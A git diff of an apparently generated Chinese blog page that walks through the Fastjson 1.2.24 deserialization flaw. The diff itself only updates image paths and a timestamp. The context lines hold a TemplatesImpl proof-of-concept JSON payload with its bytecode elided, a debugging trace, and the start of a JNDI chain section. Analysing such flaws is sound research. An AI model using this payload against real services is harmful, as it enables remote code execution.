@@ -125,7 +125,7 @@
 <meta property="og:image" content="http://example.com/pict/image-20240623003222449.png">
 <meta property="og:image" content="http://example.com/pict/image-20240623012122118.png">
 <meta property="article:published_time" content="2024-08-25T16:13:05.496Z">
-<meta property="article:modified_time" content="2024-08-25T17:43:43.589Z">
+<meta property="article:modified_time" content="2024-08-25T17:49:36.452Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/pict/image-20240612202019164.png">
@@ -417,7 +417,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 设置了SerializerFeature.WriteClassName</span><br>构造函数<br>setName<br>setAge<br>getAge<br>getName<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.example.Demo.Student&quot;</span>,<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cmisl&quot;</span>&#125;<br><br><span class="hljs-comment">// 未设置SerializerFeature.WriteClassName</span><br>构造函数<br>setName<br>setAge<br>getAge<br>getName<br>&#123;<span class="hljs-string">&quot;age&quot;</span>:<span class="hljs-number">18</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;cmisl&quot;</span>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>我们可以跟一下序列化部分。直接跟进JSON.toJSONString函数，因为是对Student对象序列化，所以序列化对的逻辑应该就是在serializer.write(object)里面了。</p>
-<p><img src="/../../pict/image-20240612202019164.png" srcset="/img/loading.gif" lazyload alt="image-20240612202019164"></p>
+<p><img src="/./pict/image-20240612202019164.png" srcset="/img/loading.gif" lazyload alt="image-20240612202019164"></p>
 <h3 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Demo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentUnserialize</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">jsonstring</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.Demo.Student\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;cmisl\&quot;&#125;&quot;</span>;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
 
 <p>输出如下</p>
@@ -560,7 +560,7 @@
 <p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(jsonstring);</code>，该若该类的子类的构造方法、setter方法、getter方法存在危险操作，则存在Fastjson反序列化漏洞；</p>
 </blockquote>
 <p>我们需要找到一条链，链首是上面提到的比较危险的方法，比如setter方法、Properties属性的getter方法，而这条链最终调用到TemplatesImpl#newTransformer函数，其实往上跟一步就找到链首了，getOutputProperties这个getter方法，正好是Properties属性，所以这个函数正是我们想要的。</p>
-<p><img src="/../../pict/image-20240614154620248.png" srcset="/img/loading.gif" lazyload alt="image-20240614154620248"></p>
+<p><img src="/./pict/image-20240614154620248.png" srcset="/img/loading.gif" lazyload alt="image-20240614154620248"></p>
 <p>那这样我们就可以构造POC了，JSON格式如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&#123;<br> <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br> <span class="hljs-string">&quot;_bytecodes&quot;</span>: [<span class="hljs-string">&quot;yv66vgAA......JA==&quot;</span>],<br> <span class="hljs-string">&quot;_name&quot;</span>: <span class="hljs-string">&quot;cmisl&quot;</span>,<br> <span class="hljs-string">&quot;_tfactory&quot;</span>: &#123;&#125;,<br> <span class="hljs-string">&quot;_outputProperties&quot;</span>: &#123;&#125;,<br>&#125;<br></code></pre></td></tr></table></figure>
 
@@ -569,16 +569,16 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(eviljsonString, Object.class, config, Feature.SupportNonPublicField);<br></code></pre></td></tr></table></figure>
 
 <p>我们的输入(恶意payload)在input里面，进入了DefaultJSONParser类的构造函数。创建了一个默认的JSON解析器</p>
-<p><img src="/../../pict/image-20240614175834265.png" srcset="/img/loading.gif" lazyload alt="image-20240614175834265"></p>
+<p><img src="/./pict/image-20240614175834265.png" srcset="/img/loading.gif" lazyload alt="image-20240614175834265"></p>
 <p>这个构造函数，如果你的输入是{xxx}的形势，就会给你的lexer.token赋值JSONToken.LBRACE这个常量，也就是12，相当于做了个标准，表示是”{“这个符号开头的字符串</p>
-<p><img src="/../../pict/image-20240618041751420.png" srcset="/img/loading.gif" lazyload alt="image-20240618041751420"></p>
-<p><img src="/../../pict/image-20240618041930329.png" srcset="/img/loading.gif" lazyload alt="image-20240618041930329"></p>
-<p><img src="/../../pict/image-20240618043431921.png" srcset="/img/loading.gif" lazyload alt="image-20240618043431921"></p>
+<p><img src="/./pict/image-20240618041751420.png" srcset="/img/loading.gif" lazyload alt="image-20240618041751420"></p>
+<p><img src="/./pict/image-20240618041930329.png" srcset="/img/loading.gif" lazyload alt="image-20240618041930329"></p>
+<p><img src="/./pict/image-20240618043431921.png" srcset="/img/loading.gif" lazyload alt="image-20240618043431921"></p>
 <p>接着在339行进入了这个默认JSON解析器的parseObject方法。这个名字一看就是解析对象</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">T</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (T) parser.parseObject(clazz, <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure>
 
 <p>这个函数中，我们会去根据将type也就是parseObject(clazz, null);中的clazz作为参数传入getDeserialize函数，大概意思是得到反序列化(反序列化器)，</p>
-<p><img src="/../../pict/image-20240618044522960.png" srcset="/img/loading.gif" lazyload alt="image-20240618044522960"></p>
+<p><img src="/./pict/image-20240618044522960.png" srcset="/img/loading.gif" lazyload alt="image-20240618044522960"></p>
 <p>跟进去之后，第一行代码会通过IdentityHashMap.java#get方法获取type对应的derializer，然后进入第一个if直接返回这个derializer，数据类型为JavaObjectDeserializer。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ObjectDeserializer</span> <span class="hljs-variable">derializer</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.derializers.get(type);<br></code></pre></td></tr></table></figure>
 
@@ -586,89 +586,89 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> (T) parser.parse(fieldName);<br></code></pre></td></tr></table></figure>
 
 <p>执行了我们之前创建的默认JSON解析器parser的parse(解析)方法，在一个switch方法里面，根据token值进行不同的case操作，之前我们给lexer.token赋值了JSONToken.LBRACE，也就是12，然后就会进入case LBRACE。然后new一个JSONObject对象，然后执行DefaultJSONParser#parseObject方法解析这个对象，fieldName为null。</p>
-<p><img src="/../../pict/image-20240618050056519.png" srcset="/img/loading.gif" lazyload alt="image-20240618050056519"></p>
+<p><img src="/./pict/image-20240618050056519.png" srcset="/img/loading.gif" lazyload alt="image-20240618050056519"></p>
 <p>这里会对我们的JSON字符串进行一些检测，比如当前字符串是否是null，是否是<code>&#125;</code>，是否既不是<code>&#123;</code>，也不是<code>,</code>，这些判断会抛出异常或者不继续执行代码逻辑，而我们当前是<code>&#123;</code>字符，正常进入函数逻辑，接着会检查下一个字符是否是<code>&quot;</code>，我们显示符合，然后就会获取我们第一个键值对的键名，也就是<code>@type</code>，赋值给key。</p>
-<p><img src="/../../pict/image-20240618050627482.png" srcset="/img/loading.gif" lazyload alt="image-20240618050627482"></p>
+<p><img src="/./pict/image-20240618050627482.png" srcset="/img/loading.gif" lazyload alt="image-20240618050627482"></p>
 <p>然后我们会进入一个if判断，判断key是否是@type，和是否开启Feature.DisableSpecialKeyDetect选项，默认没有开启，所以这个if可以直接进入，然后获取key对应的值，也就是@type的值<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，然后加载这个类。</p>
-<p><img src="/../../pict/image-20240618051613605.png" srcset="/img/loading.gif" lazyload alt="image-20240618051613605"></p>
+<p><img src="/./pict/image-20240618051613605.png" srcset="/img/loading.gif" lazyload alt="image-20240618051613605"></p>
 <p>函数里面会加载TemplatesImpl，然后吧加载的Class对象clazz和TemplatesImpl类名字添加到一个Map里面，然后return加载的clazz。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">clazz = contextClassLoader.loadClass(className);<br>mappings.put(className, clazz);<br></code></pre></td></tr></table></figure>
 
 <p>接着继续跟，来到下面两句，会先获取clazz对应的deserializer(反序列化器)，然后执行这个deserializer的deserialze函数。</p>
-<p><img src="/../../pict/image-20240618052105236.png" srcset="/img/loading.gif" lazyload alt="image-20240618052105236"></p>
+<p><img src="/./pict/image-20240618052105236.png" srcset="/img/loading.gif" lazyload alt="image-20240618052105236"></p>
 <p>由于<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的deserializer没有存在IdentityHashMap里面，无法直接获取，进入第二个if</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (type <span class="hljs-keyword">instanceof</span> Class&lt;?&gt;) &#123;<br>    <span class="hljs-keyword">return</span> getDeserializer((Class&lt;?&gt;) type, type);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>进入ParserConfig#getDeserializer，里面有检测黑名单，然后进去一系列if判断这个类的位置，没有找到。</p>
-<p><img src="/../../pict/image-20240618053109161.png" srcset="/img/loading.gif" lazyload alt="image-20240618053109161"></p>
+<p><img src="/./pict/image-20240618053109161.png" srcset="/img/loading.gif" lazyload alt="image-20240618053109161"></p>
 <p>最后到ParserConfig#createJavaBeanDeserializer函数，type和clazz一样。</p>
-<p><img src="/../../pict/image-20240618053513614.png" srcset="/img/loading.gif" lazyload alt="image-20240618053513614"></p>
+<p><img src="/./pict/image-20240618053513614.png" srcset="/img/loading.gif" lazyload alt="image-20240618053513614"></p>
 <p>在里面调用了JavaBeanInfo#build。</p>
-<p><img src="/../../pict/image-20240618053718374.png" srcset="/img/loading.gif" lazyload alt="image-20240618053718374"></p>
+<p><img src="/./pict/image-20240618053718374.png" srcset="/img/loading.gif" lazyload alt="image-20240618053718374"></p>
 <p>JavaBeanInfo#build函数中，第328行的for循环，会循环methods，而methods在135行赋值<code>Method[] methods = clazz.getMethods();</code>，所以methods是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>中的所有方法。</p>
-<p><img src="/../../pict/image-20240618054217193.png" srcset="/img/loading.gif" lazyload alt="image-20240618054217193"></p>
+<p><img src="/./pict/image-20240618054217193.png" srcset="/img/loading.gif" lazyload alt="image-20240618054217193"></p>
 <p>然后会有一些if判断，挑选中合适的方法，在429行的add函数中添加到fieldList中。这里主要是筛选setter方法。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">add(fieldList, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,annotation, fieldAnnotation, <span class="hljs-literal">null</span>));<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../pict/image-20240618054608442.png" srcset="/img/loading.gif" lazyload alt="image-20240618054608442"></p>
+<p><img src="/./pict/image-20240618054608442.png" srcset="/img/loading.gif" lazyload alt="image-20240618054608442"></p>
 <p>在490行又是一个类似的for循环，这一部分和上面差不多，筛选符合条件的getter方法放入fieldList。</p>
-<p><img src="/../../pict/image-20240618055205032.png" srcset="/img/loading.gif" lazyload alt="image-20240618055205032"></p>
-<p><img src="/../../pict/image-20240618055437206.png" srcset="/img/loading.gif" lazyload alt="image-20240618055437206"></p>
+<p><img src="/./pict/image-20240618055205032.png" srcset="/img/loading.gif" lazyload alt="image-20240618055205032"></p>
+<p><img src="/./pict/image-20240618055437206.png" srcset="/img/loading.gif" lazyload alt="image-20240618055437206"></p>
 <p>然后将初始化一个JavaBeanInfo存储这些信息，然后返回给beanInfo。</p>
-<p><img src="/../../pict/image-20240618055539484.png" srcset="/img/loading.gif" lazyload alt="image-20240618055539484"></p>
+<p><img src="/./pict/image-20240618055539484.png" srcset="/img/loading.gif" lazyload alt="image-20240618055539484"></p>
 <p>接着一些if判断都是false，直到586行才为true，进入if里面JavaBeanDeserializer函数</p>
-<p><img src="/../../pict/image-20240618134939325.png" srcset="/img/loading.gif" lazyload alt="image-20240618134939325"></p>
+<p><img src="/./pict/image-20240618134939325.png" srcset="/img/loading.gif" lazyload alt="image-20240618134939325"></p>
 <p>会调用重写的JavaBeanDeserializer方法，而第二个参数调用build，其实和我们之前的build结果一样。相当于吧config和之前的JavaBeanInfo作为参数执行了JavaBeanDeserializer方法。</p>
-<p><img src="/../../pict/image-20240618135319749.png" srcset="/img/loading.gif" lazyload alt="image-20240618135319749"></p>
+<p><img src="/./pict/image-20240618135319749.png" srcset="/img/loading.gif" lazyload alt="image-20240618135319749"></p>
 <p>遍历<code>beaninfo</code>中的<code>sortedFields</code>，然后根据对应的属性创建对应的Deserializer(反序列化器)，然后添加到<code>sortedFieldDeserializers</code>中</p>
 <p>在第二个for循环中会根据<code>fieldInfo</code>的名字调用<code>getFieldDeserializer</code>函数在<code>sortedFieldDeserializers</code>数组中寻找对应的Deserializer(反序列化器)。</p>
-<p><img src="/../../pict/image-20240618141803410.png" srcset="/img/loading.gif" lazyload alt="image-20240618141803410"></p>
+<p><img src="/./pict/image-20240618141803410.png" srcset="/img/loading.gif" lazyload alt="image-20240618141803410"></p>
 <p>回到<code>getDeserializer</code>函数，返回反序列化器。</p>
-<p><img src="/../../pict/image-20240618142958710.png" srcset="/img/loading.gif" lazyload alt="image-20240618142958710"></p>
+<p><img src="/./pict/image-20240618142958710.png" srcset="/img/loading.gif" lazyload alt="image-20240618142958710"></p>
 <p>回到<code>DefaultJSONParser#parseObject</code>函数，将反序列化器赋值给deserializer，数据类型为JavaBeanDeserializer，然后调用它的JavaBeanDeserializer#deserialze方法，开始正式反序列化。</p>
 <p>前面做了一些检查，到570行。函数名字意思是创建一个实例化，跟进。</p>
-<p><img src="/../../pict/image-20240618144129154.png" srcset="/img/loading.gif" lazyload alt="image-20240618144129154"></p>
+<p><img src="/./pict/image-20240618144129154.png" srcset="/img/loading.gif" lazyload alt="image-20240618144129154"></p>
 <p>然后经过if判断来到这里，获取了TemplatesImpl的默认构造函数，然后通过newInstance创建类的实例。此时我们就获取了TemplatesImpl类。</p>
-<p><img src="/../../pict/image-20240618144254472.png" srcset="/img/loading.gif" lazyload alt="image-20240618144254472"></p>
+<p><img src="/./pict/image-20240618144254472.png" srcset="/img/loading.gif" lazyload alt="image-20240618144254472"></p>
 <p>接着来到parseField函数，大概意思是解析字段。</p>
-<p><img src="/../../pict/image-20240618144612263.png" srcset="/img/loading.gif" lazyload alt="image-20240618144612263"></p>
+<p><img src="/./pict/image-20240618144612263.png" srcset="/img/loading.gif" lazyload alt="image-20240618144612263"></p>
 <p>JavaBeanDeserializer#parseField调用JavaBeanDeserializer#smartMatch来匹配key对应的字段反序列化器。而key匹配的对象就是之前在JavaBeanInfo#build函数中符合条件的setter和getter函数的字段名。有三个<code>outputProperties</code>，<code>stylesheetDOM</code>，<code>uRIResolver</code>。</p>
-<p><img src="/../../pict/image-20240618145249774.png" srcset="/img/loading.gif" lazyload alt="image-20240618145249774"></p>
-<p><img src="/../../pict/image-20240618145205864.png" srcset="/img/loading.gif" lazyload alt="image-20240618145205864"></p>
+<p><img src="/./pict/image-20240618145249774.png" srcset="/img/loading.gif" lazyload alt="image-20240618145249774"></p>
+<p><img src="/./pict/image-20240618145205864.png" srcset="/img/loading.gif" lazyload alt="image-20240618145205864"></p>
 <p>接着这里会有一些替换操作，比如我们传入的键名为_bytecodes，会替换掉，变为bytecodes。</p>
-<p><img src="/../../pict/image-20240618150615180.png" srcset="/img/loading.gif" lazyload alt="image-20240618150615180"></p>
-<p>然后又调用getFieldDeserializer函数获取key对应的字段反序列化器，而我们知道，只有_outputProperties这个参数存在对应的字段反序列化器。所以当key为_bytecodes匹配不到，返回null。<img src="/../../pict/image-20240618150844833.png" srcset="/img/loading.gif" lazyload alt="image-20240618150844833"></p>
+<p><img src="/./pict/image-20240618150615180.png" srcset="/img/loading.gif" lazyload alt="image-20240618150615180"></p>
+<p>然后又调用getFieldDeserializer函数获取key对应的字段反序列化器，而我们知道，只有_outputProperties这个参数存在对应的字段反序列化器。所以当key为_bytecodes匹配不到，返回null。<img src="/./pict/image-20240618150844833.png" srcset="/img/loading.gif" lazyload alt="image-20240618150844833"></p>
 <p>然后回到JavaBeanDeserializer#parseField，虽然返回null，但是后面会在ConcurrentHashMap中在获取key对应的deserOrField。然后获取其对应的DefaultFieldDeserializer(默认字段反序列化器)</p>
-<p><img src="/../../pict/image-20240618164604868.png" srcset="/img/loading.gif" lazyload alt="image-20240618164604868"></p>
-<p><img src="/../../pict/image-20240618164153627.png" srcset="/img/loading.gif" lazyload alt="image-20240618164153627"></p>
+<p><img src="/./pict/image-20240618164604868.png" srcset="/img/loading.gif" lazyload alt="image-20240618164604868"></p>
+<p><img src="/./pict/image-20240618164153627.png" srcset="/img/loading.gif" lazyload alt="image-20240618164153627"></p>
 <p>然后调用这个反序列化器的parseField解析字段操作。fieldValueDeserilizer为null，进入getFieldValueDeserilizer给fieldValueDeserilizer赋值</p>
-<p><img src="/../../pict/image-20240618165319976.png" srcset="/img/loading.gif" lazyload alt="image-20240618165319976"></p>
-<p><img src="/../../pict/image-20240618165516301.png" srcset="/img/loading.gif" lazyload alt="image-20240618165516301"></p>
+<p><img src="/./pict/image-20240618165319976.png" srcset="/img/loading.gif" lazyload alt="image-20240618165319976"></p>
+<p><img src="/./pict/image-20240618165516301.png" srcset="/img/loading.gif" lazyload alt="image-20240618165516301"></p>
 <p>接着会去用fieldValueDeserilizer的deserialze反序列化操作对_bytecodes反序列化，然后在83行setValue中给TemplatesImpl对象赋值。</p>
-<p><img src="/../../pict/image-20240618165615185.png" srcset="/img/loading.gif" lazyload alt="image-20240618165615185"></p>
+<p><img src="/./pict/image-20240618165615185.png" srcset="/img/loading.gif" lazyload alt="image-20240618165615185"></p>
 <p>可以看一下调用堆栈。这里进入了decodeBase64函数中，对我们的_bytecodes对应的值进行base64解码，然后就可以获取到我们恶意代码的字节流了，然后会在setValue赋值给TemplatesImpl对象。这也是为什么我们的payload需要base64编码的原因。</p>
-<p><img src="/../../pict/image-20240618165935913.png" srcset="/img/loading.gif" lazyload alt="image-20240618165935913"></p>
-<p><img src="/../../pict/image-20240618170143828.png" srcset="/img/loading.gif" lazyload alt="image-20240618170143828"></p>
+<p><img src="/./pict/image-20240618165935913.png" srcset="/img/loading.gif" lazyload alt="image-20240618165935913"></p>
+<p><img src="/./pict/image-20240618170143828.png" srcset="/img/loading.gif" lazyload alt="image-20240618170143828"></p>
 <p>后面的几个键对应的值也是用这种方式赋值，只是不需要base64解码了。因为他们需要赋值的对象不是byte[]数组类型。具体可以自己调试，注意在ObjectArrayCodec#deserialze绕一圈进入第二次才会进去解析_bytecodes的部分</p>
-<p><img src="/../../pict/image-20240618172124226.png" srcset="/img/loading.gif" lazyload alt="image-20240618172124226"></p>
+<p><img src="/./pict/image-20240618172124226.png" srcset="/img/loading.gif" lazyload alt="image-20240618172124226"></p>
 <p>对于key等于_outputProperties时，我们是可以直接获取它的字段反序列化器的。当它进入SetValue函数的时候，是会通过反射调用getoutputProperties方法。然后就会走到我么TemplatesImpl利用链的链首了。</p>
-<p><img src="/../../pict/image-20240618170526201.png" srcset="/img/loading.gif" lazyload alt="image-20240618170526201"></p>
-<p><img src="/../../pict/image-20240618170853320.png" srcset="/img/loading.gif" lazyload alt="image-20240618170853320"></p>
+<p><img src="/./pict/image-20240618170526201.png" srcset="/img/loading.gif" lazyload alt="image-20240618170526201"></p>
+<p><img src="/./pict/image-20240618170853320.png" srcset="/img/loading.gif" lazyload alt="image-20240618170853320"></p>
 <h4 id="调用堆栈"><a href="#调用堆栈" class="headerlink" title="调用堆栈"></a>调用堆栈</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">newInstance:<span class="hljs-number">396</span>, Class (java.lang)<br>getTransletInstance:<span class="hljs-number">455</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>setValue:<span class="hljs-number">85</span>, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseField:<span class="hljs-number">83</span>, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseField:<span class="hljs-number">773</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">600</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">188</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>deserialze:<span class="hljs-number">184</span>, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseObject:<span class="hljs-number">368</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>parse:<span class="hljs-number">1327</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>deserialze:<span class="hljs-number">45</span>, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)<br>parseObject:<span class="hljs-number">639</span>, DefaultJSONParser (com.alibaba.fastjson.parser)<br>parseObject:<span class="hljs-number">339</span>, JSON (com.alibaba.fastjson)<br>parseObject:<span class="hljs-number">302</span>, JSON (com.alibaba.fastjson)<br>main:<span class="hljs-number">38</span>, TemplatesImpl_POC (org.example.fastjson_1_2_24)<br></code></pre></td></tr></table></figure>
 
 <h4 id="一些问题总结"><a href="#一些问题总结" class="headerlink" title="一些问题总结"></a>一些问题总结</h4><h5 id="恶意类为什么要继承AbstractTranslet类？"><a href="#恶意类为什么要继承AbstractTranslet类？" class="headerlink" title="恶意类为什么要继承AbstractTranslet类？"></a>恶意类为什么要继承<code>AbstractTranslet</code>类？</h5><p>直接跟，调用堆栈如下</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">defineTransletClasses:<span class="hljs-number">418</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>getTransletInstance:<span class="hljs-number">451</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>newTransformer:<span class="hljs-number">486</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)<br>main:<span class="hljs-number">32</span>, TemplatesImpl_Test (org.example.fastjson_1_2_24)<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../../pict/image-20240614050729537.png" srcset="/img/loading.gif" lazyload alt="image-20240614050729537"></p>
+<p><img src="/./pict/image-20240614050729537.png" srcset="/img/loading.gif" lazyload alt="image-20240614050729537"></p>
 <p>只有当要加载的类，父类等于<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>时，才能有<code>_transletIndex = i</code>这样才能使得我们的<code>(AbstractTranslet) _class[_transletIndex].newInstance()</code>语句能正常执行。而这条语句，才是正常触发命令的语句，因为加载类之后还需要实例化，这一句刚好是对我们加载的恶意类进行实例化。</p>
-<p><img src="/../../pict/image-20240614050954801.png" srcset="/img/loading.gif" lazyload alt="image-20240614050954801"></p>
+<p><img src="/./pict/image-20240614050954801.png" srcset="/img/loading.gif" lazyload alt="image-20240614050954801"></p>
 <h5 id="为什么需要对-bytecodes进行Base64编码"><a href="#为什么需要对-bytecodes进行Base64编码" class="headerlink" title="为什么需要对_bytecodes进行Base64编码"></a>为什么需要对_bytecodes进行Base64编码</h5><p>调试过程中已经说明。对_bytecodes赋值前会进行base64解码。调试堆栈如下</p>
-<p><img src="/../../pict/image-20240618172731962.png" srcset="/img/loading.gif" lazyload alt="image-20240618172731962"></p>
-<h5 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h5><p>因为在TemplatesImpl#defineTransletClasses中会调用_tfactory的一个方法，如果为_tfactory为null会报错。<img src="/../../pict/image-20240618173038044.png" srcset="/img/loading.gif" lazyload alt="image-20240618173038044"></p>
+<p><img src="/./pict/image-20240618172731962.png" srcset="/img/loading.gif" lazyload alt="image-20240618172731962"></p>
+<h5 id="为什么需要设置-tfactory为"><a href="#为什么需要设置-tfactory为" class="headerlink" title="为什么需要设置_tfactory为{}"></a>为什么需要设置_tfactory为{}</h5><p>因为在TemplatesImpl#defineTransletClasses中会调用_tfactory的一个方法，如果为_tfactory为null会报错。<img src="/./pict/image-20240618173038044.png" srcset="/img/loading.gif" lazyload alt="image-20240618173038044"></p>
 <p>那它的值应该为TransformerFactoryImpl对象，为什么我们传入的是{}	</p>
 <p>JavaBeanDeserializer#deserialze中，如果_tfactory值为空，会自动创建对应的实例对象，然后返回创建的这个实例对象。</p>
-<p><img src="/../../pict/image-20240618174048503.png" srcset="/img/loading.gif" lazyload alt="image-20240618174048503"></p>
-<p><img src="/../../pict/image-20240618173958508.png" srcset="/img/loading.gif" lazyload alt="image-20240618173958508"></p>
+<p><img src="/./pict/image-20240618174048503.png" srcset="/img/loading.gif" lazyload alt="image-20240618174048503"></p>
+<p><img src="/./pict/image-20240618173958508.png" srcset="/img/loading.gif" lazyload alt="image-20240618173958508"></p>
 <h3 id="JdbcRowSetImpl的利用链"><a href="#JdbcRowSetImpl的利用链" class="headerlink" title="JdbcRowSetImpl的利用链"></a>JdbcRowSetImpl的利用链</h3><p>基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。</p>
 <h4 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI + RMI"></a>JNDI + RMI</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.JNDIServer;<br><br><span 